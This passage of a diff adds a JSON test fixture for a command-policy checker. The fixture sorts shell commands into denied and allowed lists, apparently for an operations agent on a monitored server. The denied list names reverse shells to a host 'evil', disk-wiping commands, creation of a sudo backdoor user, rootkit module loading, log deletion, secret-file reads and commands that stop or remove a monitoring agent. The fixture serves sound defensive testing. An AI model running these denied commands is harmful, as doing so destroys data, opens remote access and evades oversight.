+    "cat",
+    ".env"
+   ],
+   "code": "EXEC_SECRETS_READ",
+   "cwd": "/srv/app"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "trassa-agent"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "disable",
+    "trassa-agent.service"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/trassa/agent.toml"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/var/lib/trassa"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "pkill",
+    "trassa-agent"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "/usr/local/bin/trassa-agent",
+    "uninstall"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "cp",
+    "x",
+    "/etc/trassa/agent.toml"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "ls",
+    "/opt/trassa"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "service",
+    "trassa-agent",
+    "stop"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "journalctl",
+    "-u",
+    "trassa-agent"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "ls",
+    "/var/lib/./trassa"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "kill",
+    "-9",
+    "trassa-helper"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "--no-block",
+    "stop",
+    "trassa-helper"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "cat",
+    "enrollment.json"
+   ],
+   "code": "EXEC_TRASSA_AGENT",
+   "cwd": "/etc/trassa"
+  },
+  {
+   "argv": [
+    "useradd",
+    "evil"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "adduser",
+    "evil"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "usermod",
+    "-aG",
+    "sudo",
+    "evil"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "passwd",
+    "root"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "chpasswd"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "userdel",
+    "u"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "chage",
+    "-E",
+    "-1",
+    "root"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "groupadd",
+    "g"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "gpasswd",
+    "-a",
+    "u",
+    "sudo"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "visudo"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "chsh",
+    "-s",
+    "/bin/sh",
+    "u"
+   ],
+   "code": "EXEC_USERS_OR_PASSWORDS"
+  },
+  {
+   "argv": [
+    "mkfs.ext4",
+    "/dev/sda1"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "mkfs",
+    "-t",
+    "xfs",
+    "/dev/vdb"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "dd",
+    "if=/dev/zero",
+    "of=/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "wipefs",
+    "-a",
+    "/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "fdisk",
+    "/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "parted",
+    "/dev/sda",
+    "rm",
+    "1"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "shred",
+    "/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "blkdiscard",
+    "/dev/nvme0n1"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/*"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "--no-preserve-root",
+    "/"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-fr",
+    "/etc"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "--recursive",
+    "/usr"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "tee",
+    "/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "cp",
+    "img",
+    "/dev/vda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "mkswap",
+    "/dev/sdb"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "sgdisk",
+    "-Z",
+    "/dev/sda"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "chmod",
+    "-R",
+    "777",
+    "/"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "chown",
+    "-R",
+    "u",
+    "/"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/usr/../etc"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "chmod",
+    "-R",
+    "777",
+    "/etc/.."
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "dd",
+    "of=/dev/sda",
+    "if=/tmp/x"
+   ],
+   "code": "EXEC_DISK_DESTROY"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "."
+   ],
+   "code": "EXEC_DISK_DESTROY",
+   "cwd": "/"
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "etc"
+   ],
+   "code": "EXEC_DISK_DESTROY",
+   "cwd": "/"
+  },
+  {
+   "argv": [
+    "rm",
+    "-r",
+    ".."
+   ],
+   "code": "EXEC_DISK_DESTROY",
+   "cwd": "/var"
+  },
+  {
+   "argv": [
+    "rm",
+    "auth.log"
+   ],
+   "code": "EXEC_LOGS_OR_AUDIT",
+   "cwd": "/var/log"
+  },
+  {
+   "argv": [
+    "nc",
+    "-e",
+    "/bin/sh",
+    "evil",
+    "4444"
+   ],
+   "code": "EXEC_REVERSE_SHELL"
+  },
+  {
+   "argv": [
+    "ncat",
+    "-e",
+    "/bin/bash",
+    "x",
+    "1"
+   ],
+   "code": "EXEC_REVERSE_SHELL"
+  },
+  {
+   "argv": [
+    "socat",
+    "exec:bash",
+    "tcp:x:1"
+   ],
+   "code": "EXEC_REVERSE_SHELL"
+  },
+  {
+   "argv": [
+    "cat",
+    "/dev/tcp/1.2.3.4/80"
+   ],
+   "code": "EXEC_REVERSE_SHELL"
+  },
+  {
+   "argv": [
+    "netcat",
+    "-c",
+    "sh",
+    "x",
+    "1"
+   ],
+   "code": "EXEC_REVERSE_SHELL"
+  },
+  {
+   "argv": [
+    "insmod",
+    "rootkit.ko"
+   ],
+   "code": "EXEC_KERNEL_MODULE"
+  },
+  {
+   "argv": [
+    "modprobe",
+    "evil"
+   ],
+   "code": "EXEC_KERNEL_MODULE"
+  },
+  {
+   "argv": [
+    "rmmod",
+    "nf_tables"
+   ],
+   "code": "EXEC_KERNEL_MODULE"
+  },
+  {
+   "argv": [
+    "kexec",
+    "-l",
+    "vmlinuz"
+   ],
+   "code": "EXEC_KERNEL_MODULE"
+  },
+  {
+   "argv": [
+    "sysctl",
+    "-w",
+    "kernel.modules_disabled=0"
+   ],
+   "code": "EXEC_KERNEL_MODULE"
+  },
+  {
+   "argv": [
+    "reboot"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "shutdown",
+    "-h",
+    "now"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "poweroff"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "halt"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "init",
+    "6"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "reboot"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "telinit",
+    "0"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "soft-reboot"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "systemd-cat",
+    "bash",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemd-inhibit",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "setarch",
+    "x86_64",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "linux64",
+    "sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "logsave",
+    "/dev/null",
+    "bash",
+    "-c",
+    "id"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ssh-agent",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "dbus-run-session",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "busctl",
+    "call",
+    "org.freedesktop.systemd1",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "dbus-send",
+    "--system",
+    "x"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "run-parts",
+    "/etc/cron.daily"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "machinectl",
+    "shell",
+    ".host"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ip",
+    "netns",
+    "exec",
+    "x",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "ip",
+    "vrf",
+    "exec",
+    "x",
+    "bash"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "pkill",
+    "-f",
+    "rass"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "killall",
+    "-r",
+    "rass"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "man",
+    "-P",
+    "id",
+    "ls"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "isolate",
+    "rescue.target"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "sudoedit",
+    "/etc/hosts"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "fakeroot",
+    "sh"
+   ],
+   "code": "EXEC_RUNS_COMMANDS"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "*rassa*"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "stop",
+    "systemd-journal*"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "kill",
+    "ufw?"
+   ],
+   "code": "EXEC_UNPARSEABLE"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "start",
+    "reboot.target"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "start",
+    "poweroff.target"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "start",
+    "ctrl-alt-del.target"
+   ],
+   "code": "EXEC_REBOOT"
+  },
+  {
+   "argv": [
+    "kill",
+    "-9",
+    "-1"
+   ],
+   "code": "EXEC_TRASSA_AGENT"
+  },
+  {
+   "argv": [
+    "cp",
+    "x",
+    "/var/lib/dpkg/info/coreutils.md5sums"
+   ],
+   "code": "EXEC_PACKAGE_DB"
+  },
+  {
+   "argv": [
+    "tee",
+    "-a",
+    "/var/lib/dpkg/status"
+   ],
+   "code": "EXEC_PACKAGE_DB"
+  }
+ ],
+ "allowed": [
+  {
+   "argv": [
+    "systemctl",
+    "status",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "restart",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "start",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "journalctl",
+    "-u",
+    "nginx",
+    "-n",
+    "100"
+   ]
+  },
+  {
+   "argv": [
+    "journalctl",
+    "-u",
+    "nginx",
+    "--since",
+    "today"
+   ]
+  },
+  {
+   "argv": [
+    "df",
+    "-h"
+   ]
+  },
+  {
+   "argv": [
+    "du",
+    "-sh",
+    "/var/cache/apt"
+   ]
+  },
+  {
+   "argv": [
+    "free",
+    "-m"
+   ]
+  },
+  {
+   "argv": [
+    "uptime"
+   ]
+  },
+  {
+   "argv": [
+    "ls",
+    "-la",
+    "/etc/nginx"
+   ]
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/nginx/nginx.conf"
+   ]
+  },
+  {
+   "argv": [
+    "nginx",
+    "-t"
+   ]
+  },
+  {
+   "argv": [
+    "grep",
+    "-r",
+    "server_name",
+    "/etc/nginx/sites-enabled"
+   ]
+  },
+  {
+   "argv": [
+    "tail",
+    "-n",
+    "50",
+    "/var/log/nginx/error.log"
+   ]
+  },
+  {
+   "argv": [
+    "head",
+    "-n",
+    "20",
+    "/var/log/syslog"
+   ]
+  },
+  {
+   "argv": [
+    "ps",
+    "aux"
+   ]
+  },
+  {
+   "argv": [
+    "top",
+    "-b",
+    "-n",
+    "1"
+   ]
+  },
+  {
+   "argv": [
+    "ss",
+    "-tlnp"
+   ]
+  },
+  {
+   "argv": [
+    "ip",
+    "addr"
+   ]
+  },
+  {
+   "argv": [
+    "ip",
+    "route"
+   ]
+  },
+  {
+   "argv": [
+    "ping",
+    "-c",
+    "3",
+    "1.1.1.1"
+   ]
+  },
+  {
+   "argv": [
+    "curl",
+    "-I",
+    "https://example.com"
+   ]
+  },
+  {
+   "argv": [
+    "curl",
+    "-sS",
+    "http://localhost:8080/health"
+   ]
+  },
+  {
+   "argv": [
+    "wget",
+    "-q",
+    "--spider",
+    "https://example.com"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "ps"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "logs",
+    "app",
+    "--tail",
+    "100"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "compose",
+    "ps"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "compose",
+    "logs",
+    "--tail",
+    "50"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "restart",
+    "app"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "system",
+    "df"
+   ]
+  },
+  {
+   "argv": [
+    "docker",
+    "inspect",
+    "app"
+   ]
+  },
+  {
+   "argv": [
+    "apt-get",
+    "update"
+   ]
+  },
+  {
+   "argv": [
+    "apt-get",
+    "clean"
+   ]
+  },
+  {
+   "argv": [
+    "apt-get",
+    "autoremove",
+    "-y"
+   ]
+  },
+  {
+   "argv": [
+    "apt",
+    "list",
+    "--upgradable"
+   ]
+  },
+  {
+   "argv": [
+    "apt-get",
+    "install",
+    "-y",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "dpkg",
+    "-l",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "uname",
+    "-a"
+   ]
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/os-release"
+   ]
+  },
+  {
+   "argv": [
+    "lsblk"
+   ]
+  },
+  {
+   "argv": [
+    "mount"
+   ]
+  },
+  {
+   "argv": [
+    "findmnt"
+   ]
+  },
+  {
+   "argv": [
+    "hostnamectl"
+   ]
+  },
+  {
+   "argv": [
+    "timedatectl"
+   ]
+  },
+  {
+   "argv": [
+    "date",
+    "+%F"
+   ]
+  },
+  {
+   "argv": [
+    "id"
+   ]
+  },
+  {
+   "argv": [
+    "whoami"
+   ]
+  },
+  {
+   "argv": [
+    "stat",
+    "/var/www"
+   ]
+  },
+  {
+   "argv": [
+    "ls",
+    "/var/www"
+   ]
+  },
+  {
+   "argv": [
+    "certbot",
+    "certificates"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "list-units",
+    "--failed"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "daemon-reload"
+   ]
+  },
+  {
+   "argv": [
+    "du",
+    "-sh",
+    "/var/lib/docker"
+   ]
+  },
+  {
+   "argv": [
+    "find",
+    "/var/www",
+    "-name",
+    "*.tmp",
+    "-mtime",
+    "+7"
+   ]
+  },
+  {
+   "argv": [
+    "find",
+    "/tmp",
+    "-name",
+    "*.log",
+    "-delete"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "is-active",
+    "nginx"
+   ]
+  },
+  {
+   "argv": [
+    "/usr/sbin/nginx",
+    "-s",
+    "reload"
+   ]
+  },
+  {
+   "argv": [
+    "nproc"
+   ]
+  },
+  {
+   "argv": [
+    "lscpu"
+   ]
+  },
+  {
+   "argv": [
+    "vmstat",
+    "1",
+    "3"
+   ]
+  },
+  {
+   "argv": [
+    "iostat"
+   ]
+  },
+  {
+   "argv": [
+    "cat",
+    "/proc/loadavg"
+   ]
+  },
+  {
+   "argv": [
+    "grep",
+    "MemAvailable",
+    "/proc/meminfo"
+   ]
+  },
+  {
+   "argv": [
+    "python3",
+    "--version"
+   ]
+  },
+  {
+   "argv": [
+    "node",
+    "--version"
+   ]
+  },
+  {
+   "argv": [
+    "sha256sum",
+    "/usr/bin/nginx"
+   ]
+  },
+  {
+   "argv": [
+    "sed",
+    "--sandbox",
+    "-n",
+    "1,20p",
+    "/etc/nginx/nginx.conf"
+   ]
+  },
+  {
+   "argv": [
+    "tar",
+    "-czf",
+    "/tmp/www.tgz",
+    "/var/www"
+   ]
+  },
+  {
+   "argv": [
+    "rm",
+    "-rf",
+    "/var/www/app/cache"
+   ]
+  },
+  {
+   "argv": [
+    "ls",
+    "-la",
+    "/var/log/nginx"
+   ]
+  },
+  {
+   "argv": [
+    "cat",
+    "/etc/ssh/sshd_config"
+   ]
+  },
+  {
+   "argv": [
+    "grep",
+    "PermitRootLogin",
+    "/etc/ssh/sshd_config"
+   ]
+  },
+  {
+   "argv": [
+    "iptables",
+    "-L",
+    "-n"
+   ]
+  },
+  {
+   "argv": [
+    "ufw",
+    "status"
+   ]
+  },
+  {
+   "argv": [
+    "nft",
+    "list",
+    "ruleset"
+   ]
+  },
+  {
+   "argv": [
+    "dd",
+    "if=/dev/zero",
+    "of=/tmp/test",
+    "bs=1M",
+    "count=10"
+   ]
+  },
+  {
+   "argv": [
+    "openssl",
+    "x509",
+    "-in",
+    "/etc/ssl/certs/x.crt",
+    "-noout",
+    "-dates"
+   ]
+  },
+  {
+   "argv": [
+    "kill",
+    "-HUP",
+    "1234"
+   ]
+  },
+  {
+   "argv": [
+    "systemctl",
+    "--no-pager",
+    "status",
+    "php8.2-fpm"
+   ]
+  },
+  {
+   "argv": [
+    "ls"
+   ],
+   "cwd": "/var/www"
+  },
+  {
+   "argv": [
+    "cat",
+    "nginx.conf"
+   ],
+   "cwd": "/etc/nginx"
+  },
+  {
+   "argv": [
+    "systemctl",
+    "restart",
+    "nginx.service"
+   ]
+  },
+  {
+   "argv": [
+    "ip",
+    "-br",
+    "addr"
+   ]
+  },
+  {
+   "argv": [
+    "man",
+    "ls"
+   ]
+  },
+  {
+   "argv": [
+    "kill",
+    "-HUP",
+    "4321"
+   ]
+  },
+  {
+   "argv": [
+    "dpkg",
+    "-L",
+    "nginx"
+   ]
+  }
+ ]
+}
